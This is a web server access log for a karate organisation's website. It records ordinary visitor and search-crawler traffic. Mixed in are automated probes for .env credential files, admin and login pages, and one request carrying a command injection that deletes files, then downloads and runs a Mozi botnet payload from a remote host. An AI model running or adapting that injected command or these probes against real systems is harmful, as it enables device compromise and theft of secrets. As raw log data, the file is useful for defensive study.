::ffff:172.59.160.157 - - [22/Jul/2023:05:00:25 +0000] "GET /images/dragon-trans.png HTTP/1.1" 200 85661 "http://www.wadokikai.org/" "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Mobile Safari/537.36"
::ffff:172.59.160.157 - - [22/Jul/2023:05:00:25 +0000] "GET /images/favicon.ico HTTP/1.1" 200 3638 "http://www.wadokikai.org/" "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Mobile Safari/537.36"
::ffff:172.59.160.157 - - [22/Jul/2023:05:00:29 +0000] "GET /images/tiger.bmp HTTP/1.1" 200 311274 "http://www.wadokikai.org/" "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Mobile Safari/537.36"
::ffff:172.59.160.157 - - [22/Jul/2023:05:00:32 +0000] "GET /images/wadokikai%20kanji.jpg HTTP/1.1" 200 35066 "http://www.wadokikai.org/" "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Mobile Safari/537.36"
::ffff:172.59.160.157 - - [22/Jul/2023:05:00:36 +0000] "GET /images/dragon-trans.png HTTP/1.1" 304 - "http://www.wadokikai.org/" "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Mobile Safari/537.36"
::ffff:172.59.160.157 - - [22/Jul/2023:05:00:39 +0000] "GET /images/tiger.bmp HTTP/1.1" 304 - "http://www.wadokikai.org/" "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Mobile Safari/537.36"
::ffff:172.59.160.157 - - [22/Jul/2023:05:01:42 +0000] "GET / HTTP/1.1" 304 - "http://www.wadokikai.org/" "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Mobile Safari/537.36"
::ffff:172.59.160.157 - - [22/Jul/2023:05:01:42 +0000] "GET /images/wkkpatch22_med.png HTTP/1.1" 304 - "http://www.wadokikai.org/" "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Mobile Safari/537.36"
::ffff:172.59.160.157 - - [22/Jul/2023:05:01:42 +0000] "GET /css/wadokikai.css HTTP/1.1" 304 - "http://www.wadokikai.org/" "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Mobile Safari/537.36"
::ffff:172.59.160.157 - - [22/Jul/2023:05:01:42 +0000] "GET /js/common.js HTTP/1.1" 304 - "http://www.wadokikai.org/" "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Mobile Safari/537.36"
::ffff:172.59.160.157 - - [22/Jul/2023:05:01:42 +0000] "GET /images/schools/alamedakaratedomap.jpg HTTP/1.1" 304 - "http://www.wadokikai.org/" "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Mobile Safari/537.36"
::ffff:172.59.160.157 - - [22/Jul/2023:05:01:42 +0000] "GET /images/schools/dcakaratedomap.jpg HTTP/1.1" 304 - "http://www.wadokikai.org/" "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Mobile Safari/537.36"
::ffff:172.59.160.157 - - [22/Jul/2023:05:01:42 +0000] "GET /images/schools/orindakaratedomap.jpg HTTP/1.1" 304 - "http://www.wadokikai.org/" "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Mobile Safari/537.36"
::ffff:172.59.160.157 - - [22/Jul/2023:05:01:43 +0000] "GET /images/schools/harborbaykaratedomap.jpg HTTP/1.1" 304 - "http://www.wadokikai.org/" "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Mobile Safari/537.36"
::ffff:172.59.160.157 - - [22/Jul/2023:05:01:43 +0000] "GET /images/schools/corpuzkaratedomap.jpg HTTP/1.1" 304 - "http://www.wadokikai.org/" "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Mobile Safari/537.36"
::ffff:172.59.160.157 - - [22/Jul/2023:05:01:43 +0000] "GET /images/schools/nunleykaratedomap.jpg HTTP/1.1" 304 - "http://www.wadokikai.org/" "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Mobile Safari/537.36"
::ffff:172.59.160.157 - - [22/Jul/2023:05:01:43 +0000] "GET /images/schools/marinkaratedomap.jpg HTTP/1.1" 304 - "http://www.wadokikai.org/" "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Mobile Safari/537.36"
::ffff:172.59.160.157 - - [22/Jul/2023:05:01:43 +0000] "GET /images/schools/earhartkaratedomap.jpg HTTP/1.1" 304 - "http://www.wadokikai.org/" "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Mobile Safari/537.36"
::ffff:172.59.160.157 - - [22/Jul/2023:05:01:43 +0000] "GET /images/schools/martinezkaratedomap.jpg HTTP/1.1" 304 - "http://www.wadokikai.org/" "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Mobile Safari/537.36"
::ffff:172.59.160.157 - - [22/Jul/2023:05:01:43 +0000] "GET /images/schools/manzanitakaratedomap.jpg HTTP/1.1" 304 - "http://www.wadokikai.org/" "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Mobile Safari/537.36"
::ffff:172.59.160.157 - - [22/Jul/2023:05:01:43 +0000] "GET /images/dragon-trans.png HTTP/1.1" 304 - "http://www.wadokikai.org/" "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Mobile Safari/537.36"
::ffff:172.59.160.157 - - [22/Jul/2023:05:01:46 +0000] "GET /images/tiger.bmp HTTP/1.1" 304 - "http://www.wadokikai.org/" "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Mobile Safari/537.36"
::ffff:172.59.160.157 - - [22/Jul/2023:05:01:50 +0000] "GET /images/wadokikai%20kanji.jpg HTTP/1.1" 304 - "http://www.wadokikai.org/" "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Mobile Safari/537.36"
::ffff:172.59.160.157 - - [22/Jul/2023:05:02:14 +0000] "GET /images/dragon-trans.png HTTP/1.1" 304 - "http://www.wadokikai.org/" "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Mobile Safari/537.36"
::ffff:172.59.160.157 - - [22/Jul/2023:05:02:18 +0000] "GET /images/tiger.bmp HTTP/1.1" 304 - "http://www.wadokikai.org/" "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Mobile Safari/537.36"
::ffff:135.125.217.54 - - [22/Jul/2023:05:03:10 +0000] "GET /.env HTTP/1.1" 404 143 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:135.125.217.54 - - [22/Jul/2023:05:03:11 +0000] "POST / HTTP/1.1" 404 140 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:66.249.66.207 - - [22/Jul/2023:05:30:36 +0000] "GET /books.php HTTP/1.1" 404 148 "-" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.179 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
::ffff:66.249.66.207 - - [22/Jul/2023:05:31:33 +0000] "GET / HTTP/1.1" 200 57490 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
::ffff:185.254.196.186 - - [22/Jul/2023:05:44:32 +0000] "GET /.env HTTP/1.1" 404 143 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:185.254.196.186 - - [22/Jul/2023:05:44:33 +0000] "POST / HTTP/1.1" 404 140 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:135.125.217.54 - - [22/Jul/2023:06:08:43 +0000] "GET /.env HTTP/1.1" 404 143 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:135.125.217.54 - - [22/Jul/2023:06:08:43 +0000] "POST / HTTP/1.1" 404 140 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:17.241.219.107 - - [22/Jul/2023:06:13:02 +0000] "GET / HTTP/1.1" 200 57490 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_5) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.1.1 Safari/605.1.15 (Applebot/0.1; +http://www.apple.com/go/applebot)"
::ffff:162.142.125.12 - - [22/Jul/2023:06:20:14 +0000] "GET / HTTP/1.1" 200 57490 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
::ffff:162.142.125.12 - - [22/Jul/2023:06:20:24 +0000] "PRI * HTTP/2.0" - - "-" "-"
::ffff:162.142.125.12 - - [22/Jul/2023:06:20:24 +0000] "GET /images/favicon.ico HTTP/1.1" 200 3638 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
::ffff:162.142.125.12 - - [22/Jul/2023:06:20:24 +0000] "GET /favicon.ico HTTP/1.1" 404 150 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
::ffff:43.155.118.219 - - [22/Jul/2023:06:21:51 +0000] "HEAD /Core/Skin/Login.aspx HTTP/1.1" 404 160 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36"
::ffff:66.249.66.193 - - [22/Jul/2023:06:25:32 +0000] "GET /robots.txt HTTP/1.1" 404 149 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
::ffff:66.249.66.193 - - [22/Jul/2023:06:25:33 +0000] "GET /resources HTTP/1.1" 200 194907 "-" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.179 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
::ffff:198.235.24.208 - - [22/Jul/2023:06:39:28 +0000] "GET / HTTP/1.1" 200 57490 "-" "Expanse, a Palo Alto Networks company, searches across the global IPv4 space multiple times per day to identify customers&#39; presences on the Internet. If you would like to be excluded from our scans, please send IP addresses/domains to: scaninfo@paloaltonetworks.com"
::ffff:66.249.66.194 - - [22/Jul/2023:06:53:34 +0000] "GET /resources HTTP/1.1" 200 194907 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
::ffff:207.154.252.22 - - [22/Jul/2023:06:57:11 +0000] "GET / HTTP/1.1" 200 57490 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"
::ffff:207.154.252.22 - - [22/Jul/2023:06:57:12 +0000] "GET / HTTP/1.1" 200 57490 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"
::ffff:194.38.22.8 - - [22/Jul/2023:06:57:55 +0000] "GET /file-uploader/server/php/index.php?file=tf2rghf.jpg HTTP/1.1" 404 173 "-" "ALittle Client"
::ffff:114.119.150.154 - - [22/Jul/2023:07:01:58 +0000] "GET /contact?s=1&ss=11 HTTP/1.1" 200 9997 "http://www.wadokikai.org/" "Mozilla/5.0 (Linux; Android 7.0;) AppleWebKit/537.36 (KHTML, like Gecko) Mobile Safari/537.36 (compatible; PetalBot;+https://webmaster.petalsearch.com/site/petalbot)"
::ffff:20.163.77.135 - - [22/Jul/2023:07:06:05 +0000] "GET /.env HTTP/1.1" 404 143 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:77.0) Gecko/20100101 Firefox/77.0"
::ffff:162.243.148.62 - - [22/Jul/2023:07:08:25 +0000] "GET /owa/auth/logon.aspx?url=https%3a%2f%2f1%2fecp%2f HTTP/1.1" 404 158 "-" "Mozilla/5.0 zgrab/0.x"
::ffff:18.133.155.21 - - [22/Jul/2023:07:13:20 +0000] "GET /favicon.ico HTTP/1.1" 404 150 "-" "'Cloud mapping experiment. Contact research@pdrlabs.net'"
::ffff:128.14.209.162 - - [22/Jul/2023:07:14:37 +0000] "GET / HTTP/1.1" 200 57490 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
::ffff:18.133.155.21 - - [22/Jul/2023:07:16:59 +0000] "GET /manage/account/login HTTP/1.1" 404 159 "-" "'Cloud mapping experiment. Contact research@pdrlabs.net'"
::ffff:109.237.98.235 - - [22/Jul/2023:07:18:09 +0000] "GET /.env HTTP/1.1" 404 143 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:18.133.155.21 - - [22/Jul/2023:07:21:56 +0000] "GET /admin/index.html HTTP/1.1" 404 155 "-" "'Cloud mapping experiment. Contact research@pdrlabs.net'"
::ffff:185.254.196.173 - - [22/Jul/2023:07:24:39 +0000] "GET /.env HTTP/1.1" 404 143 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:18.133.155.21 - - [22/Jul/2023:07:26:53 +0000] "GET /index.html HTTP/1.1" 404 149 "-" "'Cloud mapping experiment. Contact research@pdrlabs.net'"
::ffff:18.133.155.21 - - [22/Jul/2023:07:32:14 +0000] "GET /+CSCOE+/logon.html HTTP/1.1" 404 157 "-" "'Cloud mapping experiment. Contact research@pdrlabs.net'"
::ffff:18.133.155.21 - - [22/Jul/2023:07:37:10 +0000] "GET /cgi-bin/login.cgi HTTP/1.1" 404 156 "-" "'Cloud mapping experiment. Contact research@pdrlabs.net'"
::ffff:141.95.74.78 - - [22/Jul/2023:07:38:24 +0000] "GET /.env HTTP/1.1" 404 143 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:141.95.74.78 - - [22/Jul/2023:07:38:25 +0000] "POST / HTTP/1.1" 404 140 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:18.133.155.21 - - [22/Jul/2023:07:42:07 +0000] "GET / HTTP/1.1" 200 57490 "-" "'Cloud mapping experiment. Contact research@pdrlabs.net'"
::ffff:66.249.66.208 - - [22/Jul/2023:07:50:00 +0000] "GET / HTTP/1.1" 200 57490 "-" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.179 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
::ffff:66.249.66.207 - - [22/Jul/2023:07:50:04 +0000] "GET /css/wadokikai.css HTTP/1.1" 200 4337 "https://wadokikai.org/" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.179 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
::ffff:135.125.246.189 - - [22/Jul/2023:07:51:25 +0000] "GET /.env HTTP/1.1" 404 143 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:135.125.246.189 - - [22/Jul/2023:07:51:25 +0000] "POST / HTTP/1.1" 404 140 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:43.155.118.219 - - [22/Jul/2023:07:56:05 +0000] "HEAD /Core/Skin/Login.aspx HTTP/1.1" 404 160 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36"
::ffff:135.125.218.67 - - [22/Jul/2023:07:59:38 +0000] "GET /.env HTTP/1.1" 404 143 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:135.125.218.67 - - [22/Jul/2023:07:59:38 +0000] "POST / HTTP/1.1" 404 140 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:209.126.151.124 - - [22/Jul/2023:08:22:19 +0000] "GET / HTTP/1.1" 200 57490 "-" "axios/0.19.2"
::ffff:209.126.151.124 - - [22/Jul/2023:08:22:19 +0000] "GET / HTTP/1.1" 200 57490 "-" "-"
::ffff:96.126.108.110 - - [22/Jul/2023:08:23:07 +0000] "GET / HTTP/1.1" 200 57490 "-" "Mozilla/5.0 (X11; Linux x86_64) Chrome/98.0.4758.132 Safari/537.36"
::ffff:40.77.167.101 - - [22/Jul/2023:08:23:21 +0000] "GET /robots.txt HTTP/1.1" 404 149 "-" "Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko; compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm) Chrome/103.0.5060.134 Safari/537.36"
::ffff:40.77.167.194 - - [22/Jul/2023:08:23:29 +0000] "GET / HTTP/1.1" 200 57490 "-" "Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko; compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm) Chrome/103.0.5060.134 Safari/537.36"
::ffff:40.77.167.194 - - [22/Jul/2023:08:38:00 +0000] "GET / HTTP/1.1" 200 57490 "-" "Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko; compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm) Chrome/103.0.5060.134 Safari/537.36"
::ffff:128.1.248.26 - - [22/Jul/2023:09:00:58 +0000] "GET / HTTP/1.1" 200 57490 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
::ffff:66.249.66.201 - - [22/Jul/2023:09:01:44 +0000] "GET /robots.txt HTTP/1.1" 404 149 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
::ffff:66.249.66.200 - - [22/Jul/2023:09:01:45 +0000] "GET /contact?s=1&ss=2 HTTP/1.1" 200 9997 "-" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.179 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
::ffff:220.173.208.130 - - [22/Jul/2023:09:08:44 +0000] "GET / HTTP/1.0" 200 57490 "-" "-"
::ffff:43.155.118.219 - - [22/Jul/2023:09:30:17 +0000] "HEAD /Core/Skin/Login.aspx HTTP/1.1" 404 160 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36"
::ffff:34.67.136.168 - - [22/Jul/2023:09:36:43 +0000] "GET / HTTP/1.1" 200 57490 "-" "Mozilla/5.0 (compatible; tchelebi/1.0; +http://tchelebi.io)"
::ffff:216.244.66.196 - - [22/Jul/2023:09:50:00 +0000] "GET /robots.txt HTTP/1.1" 404 149 "-" "Mozilla/5.0 (compatible; DotBot/1.2; +https://opensiteexplorer.org/dotbot; help@moz.com)"
::ffff:216.244.66.196 - - [22/Jul/2023:09:53:17 +0000] "GET /images/shuri-lineage.jpg HTTP/1.1" 200 120427 "-" "Mozilla/5.0 (compatible; DotBot/1.2; +https://opensiteexplorer.org/dotbot; help@moz.com)"
::ffff:135.125.246.189 - - [22/Jul/2023:10:11:36 +0000] "GET /.env HTTP/1.1" 404 143 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:135.125.246.189 - - [22/Jul/2023:10:11:37 +0000] "POST / HTTP/1.1" 404 140 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:45.56.108.128 - - [22/Jul/2023:10:12:40 +0000] "GET /systembc/password.php HTTP/1.0" 404 160 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
::ffff:185.254.196.186 - - [22/Jul/2023:10:15:04 +0000] "GET /.env HTTP/1.1" 404 143 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:185.254.196.186 - - [22/Jul/2023:10:15:05 +0000] "POST / HTTP/1.1" 404 140 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:107.170.240.12 - - [22/Jul/2023:10:21:52 +0000] "GET /autodiscover/autodiscover.json?@zdi/Powershell HTTP/1.1" 404 169 "-" "Mozilla/5.0 zgrab/0.x"
::ffff:64.225.10.235 - - [22/Jul/2023:10:31:03 +0000] "GET /t4 HTTP/1.1" 404 141 "-" "Mozilla/5.0"
::ffff:64.225.10.235 - - [22/Jul/2023:10:31:04 +0000] "GET / HTTP/1.1" 200 57490 "-" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 10.0; .NET4.0C; .NET4.0E; .NET CLR 2.0.50727; .NET CLR 3.0.30729; .NET CLR 3.5.30729)"
::ffff:66.249.66.207 - - [22/Jul/2023:10:31:45 +0000] "GET /ads.txt HTTP/1.1" 404 146 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
::ffff:66.249.66.193 - - [22/Jul/2023:10:31:45 +0000] "GET /ads.txt HTTP/1.1" 404 146 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
::ffff:222.94.163.217 - - [22/Jul/2023:10:37:55 +0000] "GET / HTTP/1.1" 200 57490 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.112 Safari/537.36"
::ffff:121.62.166.67 - - [22/Jul/2023:10:44:25 +0000] "GET /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://121.62.166.67:36928/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1 HTTP/1.0" 404 148 "-" "-"
::ffff:95.10.20.37 - - [22/Jul/2023:10:55:22 +0000] "GET /.env HTTP/1.1" 404 143 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:95.10.20.37 - - [22/Jul/2023:10:55:22 +0000] "POST / HTTP/1.1" 404 140 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:43.155.118.219 - - [22/Jul/2023:11:04:13 +0000] "HEAD /Core/Skin/Login.aspx HTTP/1.1" 404 160 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36"
::ffff:151.106.34.159 - - [22/Jul/2023:11:20:48 +0000] "GET http://8.219.177.107/c/cc.php HTTP/1.1" 404 147 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 9_1 like Mac OS X) AppleWebKit/601.1.46 (KHTML, like Gecko) Version/9.0 Mobile/13B143 Safari/601.1 (compatible; AdsBot-Google-Mobile; +http://www.google.com/mobile/adsbot.html)"
::ffff:151.106.34.159 - - [22/Jul/2023:11:20:48 +0000] "GET http://8.219.177.107/c/cc.php HTTP/1.1" 404 147 "-" "Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko; compatible; Googlebot/2.1; +http://www.google.com/bot.html) Safari/537.36"
::ffff:151.106.34.159 - - [22/Jul/2023:11:20:48 +0000] "GET http://8.219.177.107/c/cc.php HTTP/1.1" 404 147 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 9_1 like Mac OS X) AppleWebKit/601.1.46 (KHTML, like Gecko) Version/9.0 Mobile/13B143 Safari/601.1 (compatible; AdsBot-Google-Mobile; +http://www.google.com/mobile/adsbot.html)"
::ffff:151.106.34.159 - - [22/Jul/2023:11:20:49 +0000] "GET http://8.219.177.107/c/cc.php HTTP/1.1" 404 147 "-" "Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36"
::ffff:151.106.34.159 - - [22/Jul/2023:11:20:49 +0000] "GET http://8.219.177.107/c/cc.php HTTP/1.1" 404 147 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.140 Safari/537.36 Edge/18.18247"
::ffff:151.106.34.159 - - [22/Jul/2023:11:20:49 +0000] "GET http://8.219.177.107/c/cc.php HTTP/1.1" 404 147 "-" "Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko; compatible; Googlebot/2.1; +http://www.google.com/bot.html) Safari/537.36"
::ffff:151.106.34.159 - - [22/Jul/2023:11:20:49 +0000] "GET http://8.219.177.107/c/cc.php HTTP/1.1" 404 147 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3599.0 Safari/537.36"
::ffff:151.106.34.159 - - [22/Jul/2023:11:20:49 +0000] "GET http://8.219.177.107/c/cc.php HTTP/1.1" 404 147 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3599.0 Safari/537.36"
::ffff:151.106.34.159 - - [22/Jul/2023:11:20:49 +0000] "GET http://8.219.177.107/c/cc.php HTTP/1.1" 404 147 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3599.0 Safari/537.36"
::ffff:151.106.34.159 - - [22/Jul/2023:11:20:49 +0000] "GET http://8.219.177.107/c/cc.php HTTP/1.1" 404 147 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3599.0 Safari/537.36"
::ffff:151.106.34.159 - - [22/Jul/2023:11:20:49 +0000] "GET http://8.219.177.107/c/cc.php HTTP/1.1" 404 147 "-" "Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36"
::ffff:151.106.34.159 - - [22/Jul/2023:11:20:49 +0000] "GET http://8.219.177.107/c/cc.php HTTP/1.1" 404 147 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3599.0 Safari/537.36"
::ffff:151.106.34.159 - - [22/Jul/2023:11:20:49 +0000] "GET http://8.219.177.107/c/cc.php HTTP/1.1" 404 147 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3599.0 Safari/537.36"
::ffff:151.106.34.159 - - [22/Jul/2023:11:20:49 +0000] "GET http://8.219.177.107/c/cc.php HTTP/1.1" 404 147 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3599.0 Safari/537.36"
::ffff:151.106.34.159 - - [22/Jul/2023:11:20:49 +0000] "GET http://8.219.177.107/c/cc.php HTTP/1.1" 404 147 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
